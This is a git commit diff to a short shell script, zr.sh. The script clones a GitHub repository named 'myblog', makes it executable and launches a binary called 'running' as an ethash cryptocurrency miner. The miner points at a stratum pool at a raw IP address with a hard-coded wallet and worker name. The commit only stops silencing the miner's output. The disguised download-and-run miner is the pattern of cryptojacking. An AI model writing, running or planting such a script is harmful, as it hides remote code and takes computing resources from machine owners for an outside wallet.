2ea65ab830552c46f8a9d177567f8add372f90de
cata242 <57370589+cata242@users.noreply.github.com>
2022-07-23 01:35:13 +0530

    Update zr.sh

--- zr.sh
+++ zr.sh
@@ -3,4 +3,4 @@ mkdir /hoang999
 cd /hoang999
 git clone https://github.com/thaihoang999/myblog.git -q
 chmod -R +x myblog
-./myblog/running -a ethash -o stratum+tcp://51.195.4.122:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-10 > /dev/null 2>&1
+./myblog/running -a ethash -o stratum+tcp://51.195.4.122:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-10
